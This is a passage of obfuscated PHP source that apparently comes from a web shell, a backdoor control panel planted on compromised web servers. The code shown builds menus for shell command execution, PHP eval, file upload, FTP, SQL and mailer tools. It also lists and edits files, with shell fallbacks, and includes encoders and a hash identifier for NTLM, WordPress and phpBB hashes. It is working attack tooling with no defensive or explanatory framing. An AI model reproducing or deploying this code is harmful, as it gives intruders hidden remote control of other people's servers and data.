    return z6x(z5c(array('act' => $ac, 'd', 'sort'), z8v($n, ($a ? '4' : '5'), ($act == $ac && $b ? ' style="border-right:0;"' : ''))), '5');
}

function z0o($k) {
    if (!@isset($_SESSION[$k]) || !@is_array($_SESSION[$k])) {
        z0u($k);
        $_SESSION[$k] = array();
        $_SESSION[$k][] = array('act' => z7x('2', 'default_act'));
    }
}

function z2l($k) {
    if (@count($_SESSION[$k]) > 0) {
        return @count($_SESSION[$k]);
    }

    $_SESSION[$k][] = array('act' => z7x('2', 'default_act'));
    return @count($_SESSION[$k]);
}

function z0c() {
    $p = array();
    if (@count($_POST) > 0) {
        foreach ($_POST as $n => $v) {
            if (@substr($n, 0, 5) != 'backf') {
                $p[$n] = $v;
            }
        }
    }
    return $p;
}

function z0f($k) {
    $cleanp = z0c();
    if ($cleanp != z3d($k)) {
        $_SESSION[$k][] = $cleanp;
    }
}

function z3o($k) {
    $_SESSION[$k] = @array_reverse($_SESSION[$k]);
    @array_pop($_SESSION[$k]);
    $_SESSION[$k] = @array_reverse($_SESSION[$k]);
    z2i($k);
}

function z3d($k) {
    $c = z2l($k);
    if ($c == 0) {
        return array();
    }
    if ($c > 0) {
        z2i($k);
    }

    $n = (($c > 1) ? ($c - 2) : (($c > 0) ? ($c - 1) : 0));
    return $_SESSION[$k][$n];
}

function z2i($k) {
    $r = array();
    foreach ($_SESSION[$k] as $v) {
        $r[] = $v;
    }

    $_SESSION[$k] = $r;
}

function z5d($sk) {
    global $backf, $white, $back_form_actions;
    z0o($sk);
    if (@isset($backf) && $backf) {
        @array_pop($_SESSION[$sk]);
    } elseif (!@isset($white) || !$white) {
        z0f($sk);
    }
    $back = z3d($sk);
    if (z2l($sk) > 10) {
        z3o($sk);
    }

    $a = array();
    if (@count($back) > 0) {
        $a['backf'] = '1';
        if (@is_array($back)) {
            foreach ($back as $k => $v) {
                $a['backf_' . $k] = @urlencode($v);
            }
        }
    }
    $back_form_actions = $a;
    return z6x(((@count($a) > 0) ? z5c($a, z8v(z9s("23"), '15')) : z8v(z9s("23"), '5')), '5');
}

function z0s() {
    global $act, $sh_exec, $safe_exec, $bftp, $bmail;
    echo z7s(z7i(z5d('hist') . z8r(z9s("24"), "ls", (@in_array($act, array("ls", "d", "f", "dfunc")))) . z8r(z9s("25"), "search", ($act == "search")) . z8r(z9s("26"), "upload", ($act == "upload")) . (($sh_exec || $safe_exec) ? z8r(z9s("27"), "cmd", ($act == "cmd")) : '') . z8r(z9s("28"), "eval", ($act == "eval")) . ($bftp ? z8r(z9s("193"), "ftp", ($act == "ftp")) : '') . z8r(z9s("29"), "sql", ($act == "sql")) . ($bmail ? z8r(z9s("30"), "mailer", ($act == "mailer")) : '') . z8r(z9s("31"), "encoders", ($act == "encoders")) . z8r(z9s("32"), "tools", ($act == "tools")) . ($sh_exec ? z8r(z9s("33"), "processes", ($act == "processes")) : '') . z8r(z9s("34"), "sysinfo", (@in_array($act, array("sysinfo", "phpinfo")))) . z8r("&nbsp;", false, "")), '4');
}

function z7m($i, $s) {
    return ($s) ? z6n(@substr($i[1], 4)) : z6n(@substr($i[1], 0, 4));
}

function z1i($t) {
    $t = @str_replace('\\', '/', $t);
    if (@strstr($t, '//')) {
        while (@strstr($t, '//') !== false) {
            $t = @str_replace('//', '/', $t);
        }
    }
    return $t;
}

function z1a($t) {
    $t = z1i($t);
    if (@substr($t, -1) != '/') {
        $t .= '/';
    }
    if (@preg_match('/[^\/\r\n"\']+\/\.\.\//', $t)) {
        $t = @preg_replace('/[^\/\r\n"\']+\/\.\.\//', '', $t);
    }
    if ($t == '/../') {
        $t = '/';
    }
    if ($t != './' && @strstr($t, './') !== false) {
        $t = @str_replace('./', '', $t);
    }
    return $t;
}

function z3q($f, $t, $c) {
    if (@strstr($c, $f)) {
        while (@strstr($c, $f)) {
            $c = @str_replace($f, $t, $c);
        }
    }

    return $c;
}

function z1d($action) {
    global $d, $win;
    if (!$win) {
        return '';
    }

    $e = @explode("/", $d);
    $r = '';
    foreach (@range("B", "Z") as $let) {
        if ($let . ":" != @strtoupper($e[0]) && z4q($let . ":/")) {
            $r .= z5c(array("act" => $action, "d" => @strtoupper($let) . ":/"), z8v("[$let]", "1")) . z9c(2);
        }
    }
    return $r;
}

function z2d($t, $ftp = 0) {
    global $win;
    $def = "/";
    if ($win && !$ftp) {
        $path = @realpath(__FILE__);
        $def = @substr($path, 0, 1) . ":/";
    }
    if (@substr($t, -1) == '/') {
        $t = @substr($t, 0, -1);
    }
    if (@empty($t)) {
        return array($def);
    }

    $e = @explode('/', $t);
    $d = array();
    if ($win && !$ftp) {
        $p = '';
    } else {
        $p = '/';
    }
    for ($i = 0; $i < @count($e); $i++) {
        if (@empty($e[$i])) {
            $d['/'] = '/';
        } else {
            $p .= $e[$i] . '/';
            $d[$p] = $e[$i];
        }
    }
    return $d;
}

function z1j($n, $a = array(), $c = '', $g = '', $t = '1', $s = '') {
    $r = '<select name="' . $n . '"' . ($c != '' ? ' class="' . z4m($c, '4') . '"' : '') . ($s != '' ? (@is_numeric($s) ? ' ' . z10t($s) : ' ' . $s) : '') . '>' . "\n";
    if ($g != '') {
        global ${$n};
    }
    foreach ($a as $k => $v) {
        $r .= '<option value="' . ($t == '1' ? $k : $v) . '"' . (($g != '' && ($t == '1' ? $k : $v) == ${$n}) ? ' selected' : '') . '>' . ($t == '1' ? $v : $k) . '</option>' . "\n";
    }
    $r .= '</select>';
    return $r;
}

function z4a($n, $a = array(), $c = '', $g = '', $s = '') {
    return z1j($n, $a, $c, $g, '1', $s);
}

function z2u($n, $a = array(), $c = '', $g = '', $s = '') {
    return z1j($n, $a, $c, $g, '0', $s);
}

function z8j($t = 0) {
    global $d, $ftp_current_dir;
    $a = ((!$t || $t == 'l') ? z2d($d) : z2d($ftp_current_dir, 1));
    $c = @count($a);
    $i = 0;
    $n = '';
    foreach ($a as $k => $v) {
        $i++;
        $n .= z5c(($t === 0 ? array('act' => 'ls', 'd' => $k) : ($t == 'l' ? array('act' => 'ftp', 'd' => $k) : array('act' => 'ftp', 'd', 'ftp_current_dir' => $k))), z8v($v, '1') . (($v != '/' && $i != $c) ? ' / ' : ' '));
    }
    echo z10e(z7i(z7l((!$t ? z5c(array('act' => 'ls', 'd' => z3p(__FILE__)), z8n('small_home', '', '9')) . z9c() . z1d("ls") : '') . $n . (!$t ? ' (' . z6y(z9r(@fileperms($d)), z6h($d)) . ')' : ''))), '5');
}

function z2z() {
    global $d;
    echo z2b(z10e(z7i(z6x(z5c(array('act' => 'f', 'd'), z8e(z9s("35")) . z6i('f', $d, '0') . z4a('ft', array('functions' => z9s("74"), 'edit' => z9s("75"), 'new' => z9s("195")), '1') . z8v('&raquo;', '7')), '') . z6x(z5c(array('act' => 'd', 'dold' => $d), z8e(z9s("36")) . z6i('d', $d, '0') . z4a('dt', array('chdir' => z9s("425"), 'new' => z9s("195")), '1') . z8v('&raquo;', '7')), '')), '2'), '');
}

function z5r($s) {
    $a = @preg_replace('/[^0-9]/', '', $s);
    if (@empty($a)) {
        $a = "0";
    }

    $b = @substr($s, -1);
    if ($b != 'd') {
        $b = 'a';
    }
    return array($a, $b);
}

function z3i($a, $b) {
    global $v;
    return @strnatcmp(@strtolower($a[$v]), @strtolower($b[$v]));
}

function z9v($d) {
    global $with_ls;
    $r = array();
    $ls = @str_replace('\\', '', z9t('ls -a "' . $d . '" 2>/dev/null', 0));
    $e = @explode("\n", $ls);
    if (@count($e) > 0) {
        $with_ls = 1;
        foreach ($e as $p) {
            if ($p != '' && $p != $d && !@in_array($d . $p, $r)) {
                $r[] = $d . $p;
            }
        }
    }
    return $r;
}

function z4d($pn, $t = 'f') {
    if ($t == 'd') {
        $ls = @str_replace('\\', '', z9t('ls -dla "' . $pn . '" 2>/dev/null', 0));
    } else {
        $ls = @str_replace('\\', '', z9t('ls -la "' . $pn . '" 2>/dev/null', 0));
    }
    $el = @explode("\n", $ls);
    if (@count($el) > 0) {
        $l = $el[0];
    } else {
        $l = $ls;
    }
    if (@strstr($l, '->')) {
        $ll = @explode('->', $l);
        if (@count($ll) > 2) {
            @array_pop($ll);
            $l = @implode('->', $ll);
        } else {
            $l = @trim($ll[0]);
        }
    }
    $len = @strlen($l);
    $pnl = (@strlen($pn) + 1);
    if (@substr($l, -$pnl) == " " . $pn) {
        $pi = @substr($l, 0, ($len - $pnl));
        $pi = z3q('  ', ' ', $pi);
        $p2 = @explode(" ", $pi);
        if (@count($p2) > 5) {
            $pp = $p2[0];
            $pu = $p2[2];
            $pg = $p2[3];
            $ps = $p2[4];
            if (!@is_numeric($ps) && @substr($ps, -1) == "," && @is_numeric($p2[5])) {
                $ps .= $p2[5];
                $st = 6;
            } else {
                $st = 5;
            }
            if (@is_numeric($ps)) {
                $ps = z7c($ps);
            }

            $pd = '';
            for ($i = $st; $i < @count($p2); $i++) {
                $pd .= $p2[$i] . ' ';
            }

            $pd = @trim($pd);
            if (z7r('strtotime') && ($s2t = @strtotime($pd)) !== false) {
                $pd = @date("Y-m-d H:i", $s2t);
            }
            if ($pp[0] == "l") {
                return array($pn, 'LINK', $pd, array($pu, $pg), $pp);
            } elseif ($pp[0] == "d") {
                return array($pn, 'DIR', $pd, array($pu, $pg), $pp);
            } else {
                return array($pn, $ps, $pd, array($pu, $pg), $pp);
            }
        }
    }
    return array('', '', '', array('', ''), '');
}

function z8k($d) {
    global $nix, $sh_exec, $act, $lswf;
    $d = z1a($d);
    if (@substr($d, -1) != '/') {
        $d .= '/';
    }

    $r = array();
    $lswf = '';
    if (z7r('scandir') && ($h = @scandir($d))) {
        foreach ($h as $t) {
            $r[] = $d . $t;
        }

        $lswf = 'scandir';
    } elseif (z7r('dir') && ($h = @dir($d))) {
        while (($t = $h->read()) !== false) {
            $r[] = $d . $t;
        }

        $h->close();
        $lswf = 'dir';
    } elseif (z7r('opendir') && z7r('readdir') && z7r('closedir') && ($h = @opendir($d))) {
        while (($t = @readdir($h)) !== false) {
            $r[] = $t;
        }
        @closedir($h);
        $lswf = 'opendir';
    } elseif ($nix && $sh_exec && ($act == "ls" || $act == "search") && @count($r = z9v($d)) > 0) {
        $lswf = 'ls';
        return $r;
    } elseif (z7r('glob') && ($h = @glob($d . '*')) !== false) {
        if (@count($h) > 0) {
            foreach ($h as $t) {
                $r[] = $t;
            }
        }
        if (($h = @glob($d . '.*')) !== false && @count($h) > 0) {
            foreach ($h as $t) {
                $r[] = $t;
            }
        }
        if (@count($r) > 0 && !@in_array($d . '.', $r)) {
            $r[] = $d . '.';
        }
        if (@count($r) > 0 && !@in_array($d . '..', $r)) {
            $r[] = $d . '..';
        }

        $lswf = 'glob';
    }
    if (@count($r) > 0) {
        @sort($r);
    }
    return $r;
}

function z8b() {
    return (@isset($value) ? $value : 'unknown');
}

function z4t() {
    global $use_images, $use_buffer, $act, $bcopy, $bcut, $showbuf, $d, $with_ls, $lswf, $filter;
    $f_a = array('all' => z9s("37"), 'dirs' => z9s("38"), 'files' => z9s("39"), 'archives' => z9s("40"), 'exes' => z9s("41"), 'php' => z9s("42"), 'html' => z9s("43"), 'text' => z9s("44"), 'images' => z9s("45"), 'other' => z9s("46"));
    $fs = '';
    foreach ($f_a as $fk => $f) {
        $fs .= z5c(array('act', 'd', 'showbuf', 'filter' => $fk), z8v($f, (((@isset($filter) && $filter == $fk) || (!@isset($filter) && $fk == 'all')) ? '17' : '16')));
    }

    $ba = z5c(array('act', 'd', 'use_buffer' => ($use_buffer ? '0' : '1')), z8v(($use_buffer ? z9s("50") : z9s("49")), '16'));
    if ($use_buffer && (@count($bcopy) > 0 || @count($bcut) > 0)) {
        $bbcopy = (@count($bcopy) > 0);
        $bbcut = (@count($bcut) > 0);
        $ba .= z5c(array('act' => 'ls', 'd', 'emptybuf' => '1'), z8v(z9s("51"), '16')) . ((!@isset($showbuf) || !$showbuf) ? z5c(array('act' => 'ls', 'd', 'showbuf' => '1'), z8v(z9s("52"), '16')) . ($bbcopy ? z5c(array('act' => "d", 'd', 'dt' => 'bpastecopy', 'showbuf'), z8v(z9s("54"), '16')) : '') . ($bbcut ? z5c(array('act' => "d", 'd', 'dt' => 'bpastecut', 'showbuf'), z8v(z9s("55"), '16')) : '') . (($bbcopy && $bbcut) ? z5c(array('act' => "d", 'd', 'dt' => 'bpasteall', 'showbuf'), z8v(z9s("56"), '16')) : '') : z5c(array('act' => 'ls', 'd'), z8v(z9s("53"), '16')));
    }
    if (!@isset($lswf)) {
        $lswf = '';
    }

    echo z10e(z7i(z6x($fs . z5c(array('act', 'd', 'showbuf', 'use_images' => ($use_images ? '0' : '1')), z8v(($use_images ? z9s("48") : z9s("47")), '16')) . $ba, '11')), '7');
}

function z1e($t, $filter, $tt) {
    global $index;
    if (z2h($t) == '..') {
        return 1;
    }
    switch ($filter) {
    case 'dirs':
        return ($tt == 'd');
    case 'files':
        return ($tt == 'f' || $tt == 'e');
    case 'exes':
        return ($tt == 'e' || (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', @array_merge($index['cmd'], $index['pl'])) . ')$/i', $t)));
    case 'archives':
        return (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', $index['tar']) . ')$/i', $t));
    case 'php':
        return (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', $index['php']) . ')$/i', $t));
    case 'html':
        return (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', $index['html']) . ')$/i', $t));
    case 'text':
        return (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', @array_merge($index['txt'], $index['wri'], $index['doc'])) . ')$/i', $t));
    case 'images':
        return (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', $index['jpg']) . ')$/i', $t));
    case 'other':
        return ($tt == 'f' && !@preg_match('/\.(' . @implode('|', @array_merge($index['tar'], $index['php'], $index['html'], $index['jpg'], $index['txt'], $index['wri'], $index['doc'], $index['cmd'], $index['pl'])) . ')$/i', $t));
    default:
        return 1;
    }
}

function z0h($f, $t = '', $d = 0) {
    global $use_buffer, $bcut, $bcopy, $with_ls, $external, $bziparchive, $reg_archives, $nix, $sh_exec;
    if ($d == 0) {
        $d = z3p($f);
    } else {
        global $d;
    }
    $f = z2h($f);
    $a = array();
    $a['functions'] = z9s("74");
    $a['edit'] = z9s("75");
    if (@isset($reg_archives) && $reg_archives != '') {
        if (@preg_match('/\.(' . $reg_archives . ')$/', $f, $m)) {
            if (@isset($m[1])) {
                if ($m[1] != "zip" || ($m[1] == "zip" && $nix && $sh_exec)) {
                    $a['extract'] = z9s("478", $m[1]);
                }
                if ($m[1] == "zip" && $bziparchive) {
                    $a['extractzip'] = z9s("478", "zip (php)");
                }
            }
        }
    }
    if ($use_buffer && (!@isset($with_ls) || !$with_ls) && (!@isset($external) || !$external)) {
        $a['bcopy'] = (@in_array($f, $bcopy) ? z9s("69") : z9s("67"));
        $a['bcut'] = (@in_array($f, $bcut) ? z9s("70") : z9s("68"));
    }
    $a['delete'] = z9s("72");
    if (!@isset($external) || !$external) {
        $a['rename'] = z9s("73");
    }

    $a['download'] = z9s("76");
    return z5c(array('act' => 'f', 'f' => $f, 'd' => $d, 'showbuf'), z4a('ft', $a, '3') . z8v('&raquo;', '6'), $t);
}

function z0m($tt, $t = '') {
    global $use_buffer, $bcopy, $bcut, $with_ls, $showbuf;
    $a = array();
    $a['chdir'] = z9s("425");
    $a['functions'] = z9s("74");
    if ($use_buffer && (!@isset($with_ls) || !$with_ls)) {
        $a['bcopy'] = (@in_array($tt, $bcopy) ? z9s("69") : z9s("67"));
        $a['bcut'] = (@in_array($tt, $bcut) ? z9s("70") : z9s("68"));
        if (!@isset($showbuf) || !$showbuf) {
            if (@count($bcopy) > 0) {
                $a['bpastecopy'] = z9s("54");
            }
            if (@count($bcut) > 0) {
                $a['bpastecut'] = z9s("55");
            }
            if (@count($bcopy) > 0 && @count($bcut) > 0) {
                $a['bpasteall'] = z9s("56");
            }
        }
    }
    $a['rename'] = z9s("73");
    $a['delete'] = z9s("72");
    return z5c(array('act' => 'd', 'd', 'tt' => $tt, 'showbuf'), z4a('dt', $a, '3') . z8v('&raquo;', '6'), $t);
}

function z1y($d, $t) {
    return z5c(array('act' => 'd', 'd' => $d), z4a('dt', array('chdir' => z9s("425")), '3') . z8v('&raquo;', '6'), $t);
}

function z0w($d) {
    return z5c(array('act' => 'ftp', 'flsort', 'ffsort', 'd' => $d), z4a('chdir', array('' => z9s("425")), '3') . z8v('&raquo;', '6'));
}

function z0q($t) {
    return z5c(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'rd' => $t), z4a('ft', array('chdir' => z9s("425")), '3') . z8v('&raquo;', '6'));
}

function z0t($t) {
    return z5c(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'lt' => $t), z4a('ft', array('upload' => z9s("197"), 'delete' => z9s("199")), '3') . z8v('&raquo;', '6'));
}

function z0r($t) {
    return z5c(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'rt' => $t), z4a('ft', array('download' => z9s("198"), 'delete' => z9s("199")), '3') . z8v('&raquo;', '6'));
}

function z4q($t) {
    if (z4e($t) || z4j($t) || z3j($t) || z0n($t) || z0v($t) || z5o($t)) {
        return 1;
    }
    return 0;
}

function z2r($f, $t) {
    global $nix, $sh_exec;
    if (@file_exists($f)) {
        if ($t == 'f') {
            return @is_file($f);
        }
        if ($t == 'd') {
            return @is_dir($f);
        }
        if ($t == 'L') {
            return @is_link($f);
        }
        if ($t == 'r') {
            return @is_readable($f);
        }
        if ($t == 'w') {
            return @is_writable($f);
        }
        if ($t == 'x') {
            return @is_executable($f);
        }
    } elseif ($nix && $sh_exec) {
        $h = z9t('if [ -' . $t . ' "' . $f . '" ]; then echo "istrue"; else echo "isfalse"; fi', 0);
        return (@strstr($h, "istrue") && !@strstr($h, "isfalse"));
    }
    return 0;
}

function z4e($f) {
    return z2r($f, 'f');
}

function z4j($f) {
    return z2r($f, 'd');
}

function z3j($f) {
    return z2r($f, 'L');
}

function z0n($f) {
    return z2r($f, 'r');
}

function z0v($f) {
    return z2r($f, 'w');
}

function z5o($f) {
    return z2r($f, 'x');
}

function z6n($i) {
    $r = '';
    for ($n = 0; $n < @strlen($i); $n++) {
        $r .= z8p(z8p($i[$n], 1) - z8p(1, 1), 2);
    }
    return $r;
}

function z5p() {
    echo @str_repeat('', 1024);
    @ob_flush();
    @flush();
}

function z3g($t, $s) {
    $l = @strlen($s);
    if (@substr($t, -$l) == $s) {
        while (@substr($t, -$l) == $s) {
            $t = @substr($t, 0, (@strlen($t) - $l));
        }
    }
    return $t;
}

function z1k($t, $s = '/') {
    $t = z1i($t);
    $t = z3g($t, $s);
    if (!@strstr($t, $s)) {
        return array();
    }

    $e = @explode($s, $t);
    $f = $e[(@count($e) - 1)];
    $l = (@strlen($t)-@strlen($f));
    $d = @substr($t, 0, $l);
    return array(z1a($d), $f);
}

function z3p($t, $s = '/') {
    $e = z1k($t, $s);
    return (@count($e) == 2 ? $e[0] : './');
}

function z2h($t, $s = '/') {
    $e = z1k($t, $s);
    return (@count($e) == 2 ? $e[1] : $t);
}

function z2b($a, $s = '') {
    $r = '';
    if (@is_array($a)) {
        for ($i = 0; $i < @count($a); $i++) {
            $r .= z7l($a[$i], '12', (($i == 0) ? '2' . $s : (($i == (@count($a) - 1)) ? '3' . $s : $s)));
        }
    } else {
        $r = z7l($a, '12', '23' . $s);
    }
    return z10e(z7i($r), '3');
}

function z1x($c, $e = '') {
    $s = '';
    global $index;
    $i = $index;
    $a = array();
    if ($e != '') {
        foreach ($a as $k => $v) {
            if (@in_array($e, $v)) {
                $s = $k;
                break;
            }
        }
    }
    if ($s == '') {
        $s = $e;
    }
    if (@in_array($s, array('db', 'sql', 'pl', 'cgi', 'c', 'cc', 'cpp', 'h', 'hpp', 'icl', 'ipp'))) {
        $c = @highlight_string('<?php' . $c . '?>', true);
        $p1 = @stripos($c, '&lt;?php');
        $a = @substr($c, 0, $p1);
        $b = @substr($c, $p1 + 8);
        $c = $a . $b;
        $p2 = @strripos($c, '?&gt;');
        $a = @substr($c, 0, $p2);
        $b = @substr($c, $p2 + 5);
        $c = $a . $b;
    } else {
        $c = @highlight_string($c, true);
    }
    $c = @str_replace(array('<font color="', '</font>'), array('<span style="color: ', '</span>'), $c);
    $c = @preg_replace('/(\r|\n)/', '', $c);
    echo '<pre><code>' . $c . '</code></pre>';
}

function z4s($f) {
    global $filealiases;
    $r = array();
    if (@strstr($f, '/')) {
        $f = z2h($f, '/');
    }

    $ext = @strtolower(z2h($f, '.'));
    foreach ($filealiases as $k => $v) {
        if (@in_array($ext, $v)) {
            $r[] = $k;
        }
    }
    return @array_unique($r);
}

function z4x($f) {
    $a = z4s($f);
    $o = array('code', 'text');
    if (@count($a) > 0) {
        if (@count($a) > 1) {
            foreach ($a as $ft) {
                if (@in_array($ft, $o)) {
                    return $ft;
                }
            }
            return $a[0];
        } else {
            return $a[0];
        }
    } else {
        return '';
    }
}

function z3r($s) {
    if (!@preg_match('/[A-Z]/i', $s)) {
        return $s;
    }

    $s = @strtolower($s);
    for ($i = 0; $i < @strlen($s); $i++) {
        if (@preg_match('/[a-z]/', $s[$i])) {
            $s[$i] = @strtoupper($s[$i]);
            return $s;
        }
    }
    return $s;
}

function z3u($p) {
    return @decbin(@hexdec($p));
}

function z4o($p) {
    return @dechex(@bindec($p));
}

function z0l($p) {
    $r = '';
    for ($i = 0; $i < @strLen($p); $i += 2) {
        $r .= @chr(@hexdec($p[$i] . $p[$i + 1]));
    }
    return $r;
}

function z1p($p) {
    $r = '';
    for ($i = 0; $i < @strlen($p); ++$i) {
        $r .= @sprintf('%02X', @ord($p[$i]));
    }
    return @strtoupper($r);
}

function z0z($p) {
    $r = '';
    for ($i = 0; $i < @strlen($p); ++$i) {
        $r .= "\\x" . @sprintf('%02X', @ord($p[$i]));
    }
    return @chunk_split($r);
}

function z1t($p) {
    $r = '';
    for ($i = 0; $i < @strlen($p); ++$i) {
        $r .= "\\x" . @sprintf('%02X', @ord($p[$i]));
    }
    return @substr(@preg_replace('/.{1,76}/', "'\\0'.\n", $r), 0, -2);
    return @chunk_split($r);
}

function z0y($p) {
    $r = '';
    for ($i = 0; $i < @strlen($p); ++$i) {
        $r .= '%' . @dechex(@ord($p[$i]));
    }
    return @strtoupper($r);
}

function z4v($i) {
    return @chunk_split(@base64_encode($i));
}

function z3m($i) {
    return @substr(@preg_replace('/.{1,76}/', "'\\0'.\n", @base64_encode($i)), 0, -2);
}

function z3t($t) {
    $r = '';
    if (@preg_match_all('/(?<strings>[\x20-\x7E]{4,})[^\x20-\x7E]?/', $t, $m)) {
        foreach ($m["strings"] as $s) {
            $r .= $s . "\r\n";
        }
    }
    return $r;
}

function z0x() {
    $encode_functions = array();
    foreach (array("z3t" => "Strings", "urlencode" => "Urlencode", "urldecode" => "Urldecode", "z0y" => "Full Urlencode", "rawurlencode" => "Rawurlencode", "rawurldecode" => "Rawurldecode", "base64_encode" => "Base64 Encode", "z4v" => "Base64 Encode + Chunk", "z3m" => "Base64 Encode + Chunk + Quotes", "base64_decode" => "Base64 Decode", "z1p" => "ASCII to HEX", "z0z" => "ASCII to HEX + Chunk", "z0l" => "HEX to ASCII", "z_hexdec" => "HEX to DEC", "z3u" => "HEX to BIN", "dechex" => "DEC to HEX", "decbin" => "DEC to BIN", "z4o" => "BIN to HEX", "bindec" => "BIN to DEC", "strtolower" => "String to lowercase", "strtoupper" => "String to UPPERCASE", "htmlspecialchars" => "Htmlspecialchars", "strlen" => "String Length", "strrev" => "Reverse String") as $key => $val) {
        if (z7r($key) || z7r(@substr($key, 0, @strlen($key) - 1))) {
            $encode_functions[$key] = "$val";
        }
    }
    return $encode_functions;
}

function z3z($h) {
    return (@preg_match('/^[0-9a-fA-F]+$/', $h) ? 1 : 0);
}

function z1b($h) {
    return (@preg_match('/^[0-9a-zA-Z+\/.]+==$/', $h) ? 1 : 0);
}

function z2k($h) {
    $l = @strlen($h);
    $r = 'Unknown';
    if ($l === 32) {
        if (z3z($h)) {
            $r = 'MD5 / MD4 / MD2 / NTLM / Tiger128 / SNEFRU128 / RipeMD128 / Haval128_3 / Haval128_4 / Haval128_5 / Domain Cached Credentials';
        } elseif (@preg_match('/^[0-9A-F]+$/', $h)) {
            $r = 'Windows-LM / Windows-NTLM / RC4';
        } elseif (@preg_match('/^[0-9a-zA-Z+\/.]+$/', $h)) {
            $r = 'Haval192 (Base64) / Tiger-192 (Base64)';
        }
    } elseif ($l === 40) {
        if (z3z($h)) {
            $r = 'SHA-0 / SHA-1 / Tiger160 / RipeMD160 / MySQL v5.x / Haval160 / Haval160_3 / Haval160_4 / Haval160_5';
        }
    } elseif ($l === 8) {
        if (z3z($h)) {
            $r = 'ADLER32 / CRC-32 / CRC-32B / GHash-32-3 / GHash-32-3';
        }
    } elseif ($l === 13) {
        if (@preg_match('/^[0-9a-zA-Z\/.]$/', $h)) {
            $r = 'DES (Unix)';
        }
    } elseif ($l === 16) {
        if (z3z($h)) {
            $r = 'MySQL';
        }
    } elseif ($l === 4) {
        if (z3z($h)) {
            $r = 'CRC-16 / CRC-16-CCITT / FCS-16';
        }
    } elseif ($l === 34) {
        if (@preg_match('/^\$1\$[0-9a-zA-Z\/.]{8}\$[0-9a-zA-Z\/.]{22} $/', $h)) {
            $r = 'MD5 (Unix)';
        } elseif (@preg_match('/^\$P\$B[0-9a-zA-Z\/.]$/', $h)) {
            $r = 'MD5(WordPress)';
        } elseif (@preg_match('/^\$H\$9[0-9a-zA-Z\/.]$/', $h)) {
            $r = 'MD5(PhpBB3)';
        }
    } elseif ($l === 128) {
        if (z3z($h)) {
            $r = 'SHA-512 / WHIRLPOOL / SALSA20';
        }
    } elseif ($l === 96) {
        if (z3z($h)) {
            $r = 'SHA-384';
        }
    } elseif ($l === 48) {
        if (z3z($h)) {
            $r = 'Haval192 / Haval192_4 / Haval192_5 / Tiger192 / Tiger2 / SALSA10';
        }
    } elseif ($l === 56) {
        if (z3z($h)) {
            $r = 'Haval224 / Haval244_3 / Haval244_4 / SHA224';
        }
        if (z1b($h)) {
            $r = 'RipeMD320 (Base64)';
        }
    } elseif ($l === 64) {
        if (z3z($h)) {
            $r = 'SNEFRU256 / SHA-256 / RipeMD256 / Panama / Haval256 / Haval256_3 / Haval256_4 / Haval256_5';
        } elseif (@preg_match('/^[0-9a-zA-Z+\/.]+$/', $h)) {
            $r = 'SHA384 (Base64)';
        }
    } elseif ($l === 37) {
        if (@preg_match('/^\$apr1\$[0-9a-zA-Z\/.]{8}\$[0-9a-zA-Z\/.]{22} $/', $h)) {
            $r = 'MD5 (APR)';
        }
    } elseif ($l === 80) {
        if (z3z($h)) {
            $r = 'RipeMD320';
        }
    } elseif ($l === 24) {
        if (z1b($h)) {
            $r = 'Haval128 (Base64) / MD2 (Base64) / MD4 (Base64) / MD5 (Base64) / RipeMD128 (Base64) / SNEFRU128 (Base64) / Tiger128 (Base64)';
        }
    } elseif ($l === 28) {
        if (@preg_match('/^[0-9a-zA-Z+\/.]+=$/', $h)) {
            $r = 'SHA-1 (Base64) / Haval160 (Base64) / RipeMD160 (Base64) / Tiger160 (Base64)';
        }
    } elseif ($l === 44) {
        if (@preg_match('/^[0-9a-zA-Z+\/.]+=$/', $h)) {
            $r = 'Haval256 (Base64) / RipeMD256 (Base64) / SHA256 (Base64) / SNEFRU256 (Base64)';
        }
    } elseif ($l === 88) {
        if (z1b($h)) {
            $r = 'SHA512 (Base64) / WHIRLPOOL (Base64)';
        }
    } elseif ($l === 9) {
        if (@is_numeric($h)) {
            $r = 'Elf-32';
        }
    }
    return $r;
}

function z2v() {
    global $tmonth_arr, $tday_arr, $tyear_arr, $thour_arr, $tmin_arr, $tsec_arr;
    $tmonth_arr = array("" => "Month");
    $tday_arr = array("" => "Day");
    $tyear_arr = array("" => "Year");
    $thour_arr = array("" => "Hour");
    $tmin_arr = array("" => "Min");
    $tsec_arr = array("" => "Sec");
    foreach (array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December") as $tmm) {
        $tmonth_arr[$tmm] = $tmm;
    }
    for ($i = 1; $i <= 31; $i++) {
        $tday_arr[$i] = $i;
    }
    for ($i = 1998; $i <= @date("Y"); $i++) {
        $tyear_arr[$i] = $i;
    }
    for ($i = 1; $i <= 24; $i++) {
        $thour_arr[$i] = $i;
    }
    for ($i = 1; $i < 60; $i++) {
        $tmin_arr[$i] = $i;
        $tsec_arr[$i] = $i;
    }
}

function z2j() {
    global $nix, $sh_exec, $ft, $d, $f;
    $r = '';
    $a = array('functions' => z9s("74"), 'edit' => z9s("75"), 'text' => z9s("79"), 'code' => z9s("80"), 'html' => z9s("81"), 'htmls' => z9s("82"), 'exe' => z9s("83"), 'sess' => z9s("84"), 'sdb' => z9s("85"), 'ini' => z9s("86"), 'img' => z9s("87"), 'hex' => z9s("88"));
    if (($wwwdir = z3k()) !== false) {
        if (@strstr($d . $f, $wwwdir) !== false) {
            $a['web'] = z9s("89");
        }
    }
    $a['download'] = z9s("76");
    $fta = z4s($f);
    foreach ($a as $k => $v) {
        if ($k != 'exe' || ($k == 'exe' && $sh_exec)) {
            $r .= z7l(z5c(array('act' => 'f', 'd', 'f', 'ft' => $k), z8v($v, (($ft == $k) ? '12' : ((@in_array($k, $fta)) ? '13' : '14')))));
        }
    }
    echo z7s(z7i($r));
}

function z5f($d) {
    global $found, $found_d, $found_f, $search_i_f, $search_i_d, $ar, $with_ls, $s_rec, $sdir;
    $d = z1a($d);
    $h = z8k($d);
    if (count($h) > 0) {
        foreach ($h as $f) {
            $f = z2h($f);
            if ($f != "." && $f != ".." && $f != '') {
